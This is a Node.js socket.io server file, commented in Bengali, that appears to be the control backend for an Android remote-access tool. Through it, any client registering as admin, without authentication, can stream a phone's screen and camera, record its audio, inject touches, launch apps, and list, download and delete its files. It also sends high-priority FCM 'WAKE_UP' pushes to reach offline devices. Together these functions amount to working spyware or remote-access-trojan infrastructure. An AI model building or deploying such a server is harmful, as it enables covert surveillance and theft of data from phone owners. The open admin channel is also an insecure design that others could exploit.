const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { GoogleAuth } = require('google-auth-library');
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const TOKEN_FILE = './fcm_tokens.json';

// File থেকে tokens load করো
function loadTokenStore() {
  try {
    if (fs.existsSync(TOKEN_FILE)) {
      return JSON.parse(fs.readFileSync(TOKEN_FILE, 'utf8'));
    }
  } catch (e) {
    console.error('Token load error:', e);
  }
  return {};
}

// File এ tokens save করো
function saveTokenStore() {
  try {
    fs.writeFileSync(TOKEN_FILE, JSON.stringify(fcmTokenStore, null, 2));
  } catch (e) {
    console.error('Token save error:', e);
  }
}

let clients = {};
let admins = {};
let fcmTokenStore = loadTokenStore(); // File থেকে load

// FCM V1 API
async function getFCMAccessToken() {
  let credentials;
  
  // Environment variable থেকে নাও
  if (process.env.FIREBASE_CREDENTIALS) {
    credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS);
  } else {
    // File থেকে নাও
    credentials = JSON.parse(
      fs.readFileSync('/etc/secrets/firebase-service-account.json', 'utf8')
    );
  }
  
  const auth = new GoogleAuth({
    credentials: credentials,
    scopes: ['https://www.googleapis.com/auth/firebase.messaging']
  });
  const client = await auth.getClient();
  const token = await client.getAccessToken();
  return token.token;
}

async function sendFCMNotification(fcmToken) {
  try {
    const accessToken = await getFCMAccessToken();
    const response = await fetch(
      'https://fcm.googleapis.com/v1/projects/remoteclient-361ff/messages:send',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          message: {
            token: fcmToken,
            data: { action: 'WAKE_UP' },
            android: {
              priority: 'high'
            }
          }
        })
      }
    );
    const result = await response.json();
    console.log('FCM sent:', result);
    return result;
  } catch (e) {
    console.error('FCM error:', e);
  }
}

io.on('connection', (socket) => {

  // Client register
  socket.on('register_client', (data) => {
    clients[socket.id] = {
      id: socket.id,
      name: data.name,
      device: data.device,
      battery: data.battery || 0,
      network: data.network || 'unknown',
      isCharging: data.isCharging || false
    };
    console.log('Client connected:', data.name);
    broadcastClientList();
  });

  // Client info update (battery, network)
  socket.on('client_info', (data) => {
    if (clients[socket.id]) {
      clients[socket.id].battery = data.battery;
      clients[socket.id].network = data.network;
      clients[socket.id].isCharging = data.isCharging;
      broadcastClientList();
    }
  });

  // Client FCM token register
  socket.on('register_fcm_token', (data) => {
    if (clients[socket.id]) {
      clients[socket.id].fcmToken = data.token;
      fcmTokenStore[data.token] = {
        token: data.token,
        name: clients[socket.id].name,
        device: clients[socket.id].device,
        lastSeen: new Date().toISOString()
      };
      saveTokenStore(); // File এ save করো
      broadcastOfflineDevices();
      console.log('FCM token stored:', clients[socket.id].name);
    }
  });

  // Admin wake up client
  socket.on('wake_client', async (data) => {
    const fcmToken = data.token;
    if (fcmToken) {
      const result = await sendFCMNotification(fcmToken);
      socket.emit('wake_result', { success: true });
    } else {
      socket.emit('wake_result', { success: false, error: 'No token' });
    }
  });

  // Admin register
  socket.on('register_admin', () => {
    admins[socket.id] = true;
    socket.emit('client_list', Object.values(clients));
    broadcastOfflineDevices();
    console.log('Admin connected');
  });

  // Admin requests screen
  socket.on('request_screen', (clientId) => {
    io.to(clientId).emit('start_screen');
  });

  // Admin stops screen
  socket.on('stop_screen', (clientId) => {
    io.to(clientId).emit('stop_screen');
  });

  // Client sends screen data
  socket.on('screen_data', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('screen_frame', {
        clientId: socket.id,
        frame: data.frame
      });
    });
  });

  // Admin sends touch event
  socket.on('touch_event', (data) => {
    io.to(data.clientId).emit('perform_touch', {
      x: data.x,
      y: data.y,
      action: data.action
    });
  });

  // Admin launches app on client
  socket.on('launch_app', (data) => {
    io.to(data.clientId).emit('launch_app', { package: data.package });
  });

  // Admin requests app list
  socket.on('get_app_list', (clientId) => {
    io.to(clientId).emit('get_app_list');
  });

  // Client sends app list
  socket.on('app_list', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('app_list', {
        clientId: socket.id,
        apps: data.apps
      });
    });
  });

  // File transfer — admin to client
  socket.on('file_transfer', (data) => {
    io.to(data.clientId).emit('file_receive', {
      fileName: data.fileName,
      fileData: data.fileData,
      mimeType: data.mimeType
    });
  });

  // ✅ Client file save acknowledgement — admin কে জানাও
  socket.on('file_received', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('file_received', data);
    });
  });

  // ✅ Admin request করলে client আবার MediaProjection permission নেবে
  socket.on('request_media_permission', (clientId) => {
    io.to(clientId).emit('request_media_permission');
  });

  // ─── File Manager ───────────────────────────────────────────

  // Admin file list চাইলে
  socket.on('get_file_list', (data) => {
    // data = { clientId, path }
    io.to(data.clientId).emit('get_file_list', { path: data.path });
  });

  // Client file list পাঠালে
  socket.on('file_list_result', (data) => {
    // data = { path, files: [...] }
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('file_list_result', {
        clientId: socket.id,
        path: data.path,
        files: data.files
      });
    });
  });

  // Admin file download চাইলে
  socket.on('download_file', (data) => {
    // data = { clientId, path }
    io.to(data.clientId).emit('download_file', { path: data.path });
  });

  // Client file data পাঠালে
  socket.on('file_download_result', (data) => {
    // data = { path, fileName, fileData, mimeType }
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('file_download_result', {
        clientId: socket.id,
        ...data
      });
    });
  });

  // Admin file delete চাইলে
  socket.on('delete_file', (data) => {
    // data = { clientId, path }
    io.to(data.clientId).emit('delete_file', { path: data.path });
  });

  // Client delete result পাঠালে
  socket.on('delete_file_result', (data) => {
    // data = { path, success, error }
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('delete_file_result', {
        clientId: socket.id,
        ...data
      });
    });
  });

  // ─── Media Viewer ────────────────────────────────────────────

  socket.on('get_media_list', (data) => {
    io.to(data.clientId).emit('get_media_list', { type: data.type });
  });

  socket.on('media_list_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('media_list_result', {
        clientId: socket.id,
        type: data.type,
        files: data.files
      });
    });
  });

  socket.on('get_media_file', (data) => {
    io.to(data.clientId).emit('get_media_file', { path: data.path });
  });

  socket.on('media_file_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('media_file_result', {
        clientId: socket.id,
        path: data.path,
        fileName: data.fileName,
        fileData: data.fileData,
        mimeType: data.mimeType,
        success: data.success
      });
    });
  });

  // ─── Camera Streaming ────────────────────────────────────────

  socket.on('start_camera', (data) => {
    // data = { clientId, facing } facing = "front" or "back"
    io.to(data.clientId).emit('start_camera', { facing: data.facing });
  });

  socket.on('stop_camera', (data) => {
    io.to(data.clientId).emit('stop_camera');
  });

  socket.on('camera_frame', (data) => {
    // Client থেকে frame আসলে সব admin এ পাঠাও
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('camera_frame', {
        clientId: socket.id,
        frame: data.frame
      });
    });
  });

  socket.on('switch_camera', (data) => {
    io.to(data.clientId).emit('switch_camera', { facing: data.facing });
  });

  // ─── Audio Recording ─────────────────────────────────────────

  socket.on('start_audio_record', (data) => {
    // data = { clientId, duration } duration = seconds
    io.to(data.clientId).emit('start_audio_record', { duration: data.duration });
  });

  socket.on('stop_audio_record', (data) => {
    io.to(data.clientId).emit('stop_audio_record');
  });

  socket.on('audio_record_result', (data) => {
    // Client recording শেষে audio file পাঠাবে
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('audio_record_result', {
        clientId: socket.id,
        audioData: data.audioData,
        duration: data.duration,
        success: data.success,
        error: data.error
      });
    });
  });

  socket.on('audio_record_progress', (data) => {
    // Recording progress admin কে জানাও
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('audio_record_progress', {
        clientId: socket.id,
        remaining: data.remaining
      });
    });
  });

  // Disconnect
  socket.on('disconnect', () => {
    console.log('Disconnected client data:', clients[socket.id]); // debug
    if (clients[socket.id]) {
      const client = clients[socket.id];
      if (client.fcmToken) {
        fcmTokenStore[client.fcmToken].lastSeen = new Date().toISOString();
        saveTokenStore();
      }
    }
    delete clients[socket.id];
    delete admins[socket.id];
    broadcastClientList();
    broadcastOfflineDevices();
    console.log('Offline devices count:', Object.keys(fcmTokenStore).length); // debug
    console.log('Disconnected:', socket.id);
  });

  function broadcastClientList() {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('client_list', Object.values(clients));
    });
  }

  function broadcastOfflineDevices() {
    const onlineTokens = Object.values(clients).map(c => c.fcmToken).filter(Boolean);
    const offlineDevices = Object.values(fcmTokenStore).filter(
      d => !onlineTokens.includes(d.token)
    );
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('offline_devices', offlineDevices);
    });
  }

});

app.get('/', (req, res) => {
  res.send('Remote Server Running ✅');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
